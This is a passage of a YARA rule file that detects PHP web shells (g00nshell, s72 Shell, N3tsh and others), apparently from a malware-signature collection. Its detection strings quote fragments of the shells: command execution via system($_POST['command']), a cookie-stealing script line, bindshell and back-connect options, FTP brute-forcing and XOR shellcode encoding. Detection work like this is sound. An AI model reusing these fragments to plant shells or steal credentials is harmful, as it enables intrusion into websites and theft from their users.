      $s18 = "onclick=\"document.reqs.action.value='editor'; document.reqs.submit();\">|" fullword ascii
      $s19 = "onclick=\"document.reqs.action.value='exit'; document.reqs.submit();\">|" fullword ascii
      $s20 = "onclick=\"document.reqs.action.value='viewer'; document.reqs.submit();\">|" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_26aff140c2f73f11d0c78b8823ade092_528f2ab667dc8492e589a00c579edaaf16f03859_aa0fc6f6_166
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 26aff140c2f73f11d0c78b8823ade092.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php, arabicspy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "1a96d8b149d930cfea410ba3c247efac03bd71e4fec0460f3522950b1fd13a19"
      hash3 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash4 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
      hash5 = "9ca895d820411a2b1c4f1f5ca668d10550b897342126ffee1b58f3f1e9d38897"
   strings:
      $s1 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s2 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s3 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s4 = "$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';" fullword ascii
      $s5 = "@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);" fullword ascii
      $s6 = "$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';" fullword ascii
      $s7 = "$dbpassword = $_POST['dbpassword'];" fullword ascii
      $s8 = "$upsize=get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"" fullword ascii
      $s9 = "<input type=\"hidden\" name=\"do\" value=\"login\">" fullword ascii
      $s10 = "echo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";" fullword ascii
      $s11 = "echo \"<form action=\\\"?action=phpenv\\\" method=\\\"POST\\\">\\n\";" fullword ascii
      $s12 = "elseif ($_GET['action'] == \"proxy\") {" fullword ascii
      $s13 = "$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN" ascii
      $s14 = "elseif ($_GET['action'] == \"sqlbak\") {" fullword ascii
      $s15 = "$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" ascii
      $s16 = "$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" ascii
      $s17 = "$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style=\"padding-left: 5px;\"');" fullword ascii
      $s18 = "$delregname = $_POST['delregname'];" fullword ascii
      $s19 = "$sql_query = $_POST['sql_query'];" fullword ascii
      $s20 = "elseif ($_GET['action'] == \"reg\") {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _0b0e93a29be990d421ee6b23671f7fbc104cb650_79b4102985370f66600af24d529ceac278106845_167
{
   meta:
      description = "php17 - from files 0b0e93a29be990d421ee6b23671f7fbc104cb650.php, 79b4102985370f66600af24d529ceac278106845.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c4b014b68d484905681e4055a154490ad2d48b732022b35eff98ee94c4d8232"
      hash2 = "8433dcfcf3d911ea2f947298754d58102b60ad9b47caa60c88f96441fbdcba86"
   strings:
      $x1 = "$uakey = \"b5c3d0b28619de70bf5588505f4061f2\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill" fullword ascii
      $x3 = "$sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']" fullword ascii
      $x4 = "$pass = \"47e331d2b8d07465515c50cb0fad1e5a\"; // MD5 encoded Password" fullword ascii
      $s5 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_pas" fullword ascii
      $s6 = "$user  = \"af1035a85447f5aa9d21570d884b723a\"; // MD5 encoded User" fullword ascii
      $s7 = "#'http://site.com/shl.php?cookie='+document.cookies</script>         #" fullword ascii
      $s8 = "sql&db=\" . $_GET['db'] . \"&table=\" . $row[0] .\"&sqlf=dl'>Download</a>]</td></tr>\\n\");" fullword ascii
      $s9 = "#To execute commands, simply include ?cmd=___ in the url.            #" fullword ascii
      $s10 = "#Ex: http://site.com/shl.php?cmd=whoami                              #" fullword ascii
      $s11 = "echo(\"<tr><td><a href='?act=sql&db=\" . $_GET['db'] . \"&table=\" . $row[0] .\"'>\" . $row[0] . \"</a></td><td>[<a href='?act=" fullword ascii
      $s12 = "#1: User-Agent required                                              #" fullword ascii
      $s13 = "\"' target='frm'>\" . $link . \"</a> ] \");}}" fullword ascii
      $s14 = "input,textarea,select { color:#FFFFFF; background-color:#2F2F2F; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px" fullword ascii
      $s15 = "else{$file = \"<tr><td><img src='?img=\" . $file['icon']. \"' height='18' width='18'>*\" . $file['link'] . \"<td>\" . $file['s" fullword ascii
      $s16 = "if($_SERVER['QUERY_STRING']){$file = \"<tr><td><img src='?\" . $_SERVER['QUERY_STRING'] . \"&img=\" . $file['icon']. \"' heig" fullword ascii
      $s17 = "if($_SERVER['QUERY_STRING']){$folder = \"<img src='?\" . $_SERVER['QUERY_STRING'] . \"&img=\" . $file['icon']. \"'>*\" . $file" fullword ascii
      $s18 = "case \"read\": @$file['link'] = \"<a href='?act=view&f=\" . $link . \"&dir=$dir'><font color='yellow'>$link</font></a>\"; br" fullword ascii
      $s19 = "#                       g00nshell v1.3 final                         #" fullword ascii
      $s20 = "case \"none\": @$file['link'] = \"<a href='?act=view&f=\" . $link . \"&dir=$dir'><font color='red'>$link</font></a>\"; break" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _2018_80aba3348434c66ac471daab949871ab16c50042_168
{
   meta:
      description = "php17 - from files 2018.php, 80aba3348434c66ac471daab949871ab16c50042.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e066a698d8943cebe2c383c7d85f1e2607a8d4ccd77bf8a1882df428b644e85c"
      hash2 = "0d850cf8c1d527d832428f46648e3887889df1df602c72d9c381b31639a8d39f"
   strings:
      $s1 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=" fullword ascii
      $s2 = "<font face=\"Comic Sans MS\" size=\"1\">[ Diziler -_- Dizinler ]</td>" fullword ascii
      $s3 = "<body background=\"refbgd2.gif\" bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#666699\" vlink=\"#999999\" alink=\"#999900\">" fullword ascii
      $s4 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"43\" ></textarea> <br>" fullword ascii
      $s5 = "b><font color=\"#FF0000\"></td></font></b></font><form enctype=\"multipart/form-data\" method=\"post\">" fullword ascii
      $s6 = "<p><font face=\"Comic Sans MS\" color=\"#FF0000\"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb" ascii
      $s7 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya Upload Edebilirsiniz.</font><br>" fullword ascii
      $s8 = "<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>" fullword ascii
      $s9 = "<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp" fullword ascii
      $s10 = "nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ " fullword ascii
      $s11 = "&nbsp;</font></font><p align=\"center\"><form method=\"post\">" fullword ascii
      $s12 = "<meta name=\"Microsoft Theme\" content=\"refined 011\">" fullword ascii
      $s13 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=\"" ascii
      $s14 = "</font><font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buraya " fullword ascii
      $s15 = "sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>s72 Shell v1.1 Coding by <a href=\"mailto:" ascii
      $s16 = "<b><font face=\"Comic Sans MS\" size=\"1\" color=\"#FF0000\">[ Upload ]</font></b></font><font face=\"Comic Sans MS\" size=\"1\"" ascii
      $s17 = "<font color=\"#800080\"><b><font face=\"Verdana\" style=\"font-size: 8pt\">" fullword ascii
      $s18 = "sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
      $s19 = "<font color=\"#00FF00\">Cr@zy_King&nbsp; </font>" fullword ascii
      $s20 = "<td width=\"51%\" height=\"24\" bgcolor=\"#FCFEBA\">" fullword ascii
   condition:
      ( uint16(0) == 0x683c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_3c7b93811ffd056b5952b80a517c10c2_5bdae9780fa349f3b58c475985c13c012897bd61_64_169
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 3c7b93811ffd056b5952b80a517c10c2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "ea918b9d0452f99243cd726116e120d79a68c881cca87d1e467e72c646eff74a"
      hash4 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash5 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash6 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash7 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $s2 = ": site exec <font color=#006600>\".$_POST[\"SUCommand\"].\"</font> <br>\";" fullword ascii
      $s3 = "$domain  = \"-SETDOMAIN\\r\\n\".\"-Domain=haxorcitos|0.0.0.0|21|-1|1|0\\r\\n\".\"-TZOEnable=0\\r\\n\".\" TZOKey=\\r\\n\";" fullword ascii
      $s4 = "if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))" fullword ascii
      $s5 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $s6 = "$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';" fullword ascii
      $s7 = "if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';" fullword ascii
      $s8 = "$sendbuf = \"PASS \".$_POST['password'].\"\\r\\n\";" fullword ascii
      $s9 = "$deldomain = \"-DELETEDOMAIN\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\" PortNo=21\\r\\n\";" fullword ascii
      $s10 = "else echo File_Write($_POST['dpath'],$contents,'wb') ? '" fullword ascii
      $s11 = "$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';" fullword ascii
      $s12 = "waysAllowLogin=0\\r\\n\".\"-ChangePassword=0\\r\\n\"." fullword ascii
      $s13 = ".\"\\r\\n\".\"-HomeDir=c:\\\\\\r\\n\".\"-LoginMesFile=\\r\\n\".\"-Disable=0\\r\\n\".\"-RelPaths=1\\r\\n\".\"-NeedSecure=0\\r\\n" ascii
      $s14 = "<input name=\"part\" type=\"text\" value=\"C:\\\\\\\\\" style=\"width:200px\"></div>" fullword ascii
      $s15 = "<input name=\"dpath\" value=\"{$Com_dpath}\" type=\"text\" style=\"width:600px;\"></div>" fullword ascii
      $s16 = "IP <input type=\"text\" name=\"ip\" value=\"{$Port_ip}\" style=\"width:600px;\"> </div>" fullword ascii
      $s17 = "\"-Maintenance=None\\r\\n\".\"-PasswordType=Regular\\r\\n\".\"-Ratios=None\\r\\n\".\" Access=\".$_POST['part'].\"\\|RWAMELCDP\\r" ascii
      $s18 = "<input type=\"text\" name=\"port\" value=\"{$Port_port}\" style=\"width:597px;\"></div>" fullword ascii
      $s19 = "<input name=\"durl\" value=\"{$Com_durl}\" type=\"text\" style=\"width:600px;\"></div>" fullword ascii
      $s20 = "echo '<td>'.$statucoll[$k].'</td><td align=\"right\">'.File_Size($statusize[$k]).'</td></tr>'.\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05311655a15b75fab86956663e1819cd_8cb6a80a86bf37cd3977cab94909c299ec22a092_170
{
   meta:
      description = "php17 - from files 05311655a15b75fab86956663e1819cd.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $x1 = "function N3tftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x2 = "$logfile = $tmpdir_logs.\"N3tsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s3 = "elseif (!$data = N3tgetsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s4 = ".$k.\"][0] - unknown command.\"; N3tshexit();}" fullword ascii
      $s5 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight[\".$k" ascii
      $s6 = "elseif (!$data = N3tgetsource($bind[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s7 = "if ($actemptybuff) {$sess_data[\"copy\"] = $sess_data[\"cut\"] = array(); N3t_sess_put($sess_data);}" fullword ascii
      $s8 = "if (N3tftpbrutecheck(\"localhost\",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))" fullword ascii
      $s9 = "\"N3tsh_bindport.pl\" => \"N3tsh_bindport_pl.txt\"," fullword ascii
      $s10 = "\"N3tsh_datapipe.pl\" => \"N3tsh_datapipe_pl.txt\"," fullword ascii
      $s11 = "\"N3tsh_bindport.c\" => \"N3tsh_bindport_c.txt\"," fullword ascii
      $s12 = "\"N3tsh_datapipe.c\" => \"N3tsh_datapipe_c.txt\"," fullword ascii
      $s13 = "\"N3tsh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehost %remoteport\")," fullword ascii
      $s14 = "\"N3tsh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword ascii
      $s15 = "if ($name) {return file_get_contents($N3tsh_sourcesurl.$name);}" fullword ascii
      $s16 = "\"N3tsh_datapipe.c\"=>array(\"Using C\",\"%path %localport %remoteport %remotehost\")" fullword ascii
      $s17 = "elseif (!$data = N3tgetsource($bc[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s18 = "\"N3tsh_bindport.c\"=>array(\"Using C\",\"%path %port %pass\")" fullword ascii
      $s19 = "if ($selfwrite or $updatenow) {@ob_clean(); N3tsh_getupdate($selfwrite,1); exit;}" fullword ascii
      $s20 = "\"N3tsh_backconn.c\"=>array(\"Using C\",\"%path %host %port\")" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05806173863ac450b499d538bc7713c7e8c869dd_145df8286e456945e2630ac284cadc77_1626580cc64569879a427931137aa9c2434d2c8c_254a3c59_171
{
   meta:
      description = "php17 - from files 05806173863ac450b499d538bc7713c7e8c869dd.php, 145df8286e456945e2630ac284cadc77.php, 1626580cc64569879a427931137aa9c2434d2c8c.php, 254a3c59f7e28d66209d48d9135291eb8cd0be83.php, 258297b62aeaf4650ce04642ad5f19be25ec29c9.php, 387dd602d5fe0192968d4798b87841e47d854e27.php, 6454cc5ab73143d72cf0025a81bd1fe710351b44.php, 90c74648f3e196fda8c32e3a0cc846892ed759e1.php, a5c2dcfaba591c4f57de219e66eb0d3ea9d06174.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc0c3100095d9397871f92538344cc185be21fbc7d0715b05bb1fcc5ef598813"
      hash2 = "a2483c07b4aab2d4fab08d0a70ccbaab91c10cf2e1952fa55befa397c82d1cd5"
      hash3 = "c3db747c7f3d5d350e1c5bfe54200aa727b335bb4e5123d67ef9102aefdaa331"
      hash4 = "75d34237cc7dab59582abafb3069af0b1c240d860766e818953ff7df7eca87f3"
      hash5 = "b4aa7508f9deba56f605ceb7fae290d5c0f9f23515fa6fe3b09fa3b1ce2eb073"
      hash6 = "8c476a6b67fdba2ddbc25daacc6b316daccd91206750419e7080c95f4b41d817"
      hash7 = "236d757657925bf85cb39eb13606e3a36df8c49b26365639e4dad81752060ee0"
      hash8 = "aacb1f283fd9383949e2ec4b6e3242660c813f0e65a02bed1874ff63bcf28dd6"
      hash9 = "9a3ac5f1bb8152c9e24f9d66a1975bf9b8968eb719074a5bc9a0dcef3b7d6df6"
   strings:
      $s1 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s2 = "echo \"<script language='javascript'> alert('Success! Please refresh')</script>\";" fullword ascii
      $s3 = "<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>" fullword ascii
      $s4 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword ascii
      $s5 = "<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>" fullword ascii
      $s6 = "echo \"<center><form method='post' action=''>" fullword ascii
      $s7 = "echo \"<form action='' method='POST'>\";" fullword ascii
      $s8 = "<textarea rows='10' cols=50 name='Comments' ></textarea><br>" fullword ascii
      $s9 = "echo \"<font size='1' color='#FF0000'><b>No ReadAble</b>\";" fullword ascii
      $s10 = "<form method='POST' action=''><br>" fullword ascii
      $s11 = "<td width='113' align='center' nowrap><font color='#000080' size='2'><b>\";" fullword ascii
      $s12 = "<p align=\"center\"><font color=\"#666666\" size=\"1\" face=\"Tahoma\"><br>" fullword ascii
      $s13 = "Number-Mail :<br><input type='text' size='5' name='nom' value='100'><br>" fullword ascii
      $s14 = "mail($to,$subject,$Comments,\"From:$from\");" fullword ascii
      $s15 = "$savefile=$_POST['savefile'];" fullword ascii
      $s16 = "$frpath=$_GET['fdelete'];" fullword ascii
      $s17 = "<input type='text' name='filepath'  size='60' value='$fedit'>" fullword ascii
      $s18 = "$id=$_GET['id'];" fullword ascii
      $s19 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword ascii
      $s20 = "<font color='#000080' size='2'><b>Size KByte</b></font></td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87_9735037eae2f73171d007caca31fbfb6467850d5_172
{
   meta:
      description = "php17 - from files 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 9735037eae2f73171d007caca31fbfb6467850d5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash2 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
   strings:
      $s1 = "if ((strpos ($shellcode[0],'tp:')) || (strpos ($shellcode[0],'url')) || (strpos ($shellcode[0],'exe')))" fullword ascii
      $s2 = "$shellcode[0] = shellcode_decode($Url_String, dechex($i));" fullword ascii
      $s3 = "function shellcode_encode($Url_String,$Oday_value)" fullword ascii
      $s4 = "function shellcode_decode($Url_String,$Oday_value)" fullword ascii
      $s5 = "if($_POST['xor'] == 'b'){$checkeda = '';$checkedb = ' checked';$Shell_Code_Array = shellcode_findxor($_POST['code']);$Shell_Code" ascii
      $s6 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s7 = "if($_POST['xor'] == 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code']" ascii
      $s8 = "function shellcode_findxor($Url_String)" fullword ascii
      $s9 = "if((!empty($_POST['address'])) && (!empty($_POST['user'])) && (!empty($_POST['pass'])))" fullword ascii
      $s10 = "if($_POST['class'] == 'mysql') $connect = @mysql_connect($_POST['address'],$_POST['user'],chop($SORTPASS[$k]));" fullword ascii
      $s11 = "function Shellcode_j()" fullword ascii
      $s12 = "$shellcode[1] = dechex($i);" fullword ascii
      $s13 = "return $shellcode;" fullword ascii
      $s14 = "for($n=0; $n < strlen($COPY); $n+=2){$Decode .= pack(\"C\", hexdec(substr($COPY, $n, 2) )^ $Oday_value);}" fullword ascii
      $s15 = "if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],cho" ascii
      $s16 = "if($_POST['class'] == 'ftp'){$Ftp_conn = @ftp_connect($_POST['address'],'21');$connect = @ftp_login($Ftp_conn,$_POST['user'],cho" ascii
      $s17 = "$Temp = $SHELL[$i];" fullword ascii
      $s18 = "$SORTPASS = explode(',',$_POST['pass']);" fullword ascii
      $s19 = "if (hexdec($Hex_Temp) < 16) $Hex_Temp = '0'.$Hex_Temp;" fullword ascii
      $s20 = "if ($Length%2) $hex .= $Oday_value.$Oday_value; else $hex .= $Oday_value.$Oday_value.$Oday_value.$Oday_value;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__173
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash5 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash8 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash9 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash10 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash11 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash12 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash13 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash14 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash15 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash16 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash17 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash18 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash19 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "'eng_text41'=>'Save dump in file'," fullword ascii
      $s2 = "'eng_text9' =>'Bind port to /bin/bash'," fullword ascii
      $s3 = "'eng_text37'=>'Login'," fullword ascii
      $s4 = "'eng_text68'=>'Command'," fullword ascii
      $s5 = "'eng_text38'=>'Password'," fullword ascii
      $s6 = "'eng_text24'=>'Remote host'," fullword ascii
      $s7 = "'eng_text48'=>'Delete temp files'," fullword ascii
      $s8 = "'eng_text15'=>'Upload files from remote server'," fullword ascii
      $s9 = "'eng_text47'=>'Show variables from php.ini'," fullword ascii
      $s10 = "'eng_text49'=>'Delete script from server'," fullword ascii
      $s11 = "'eng_text25'=>'Remote port'," fullword ascii
      $s12 = "'eng_butt5' =>'Run'," fullword ascii
      $s13 = "'eng_butt3' =>'Bind'," fullword ascii
      $s14 = "'eng_text44'=>'Can\\'t edit file! Only read access!'," fullword ascii
      $s15 = "'eng_text76'=>'Search text in files via find'," fullword ascii
      $s16 = "'eng_butt2' =>'Upload'," fullword ascii
      $s17 = "'eng_text28'=>'Work in safe_mode'," fullword ascii
      $s18 = "'eng_text54'=>'Find text in files'," fullword ascii
      $s19 = "'eng_text51'=>'View memory info'," fullword ascii
      $s20 = "'eng_text57'=>'Create/Delete File/Dir'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _a79be3a055b701ad9977b5176d0478aa0b0dffd4_a79be3a055b701ad9977b5176d0478aa0b0dffd4_174
{
   meta:
      description = "php17 - from files a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash2 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
   strings:
      $s1 = "@mssql_query(\"drop table SnIpEr_SA_temp_table\",$db);" fullword ascii
      $s2 = "$snewstring=str_replace(')','',$newstring); // get rid of the last ')'" fullword ascii
      $s3 = "}elseif (strncmp($arr[1],'set',3)==0 || strncmp($arr[1],'enum',4)==0){  // We have a field type of set or enum" fullword ascii
      $s4 = "\\$cur_time = time - \\$itime;" fullword ascii
      $s5 = "$newstring=substr($arr[1],$pos+1);  // get rid of the '???('" fullword ascii
      $s6 = "$num=substr_count($arr[1],',') + 1;  // count the number of entries" fullword ascii
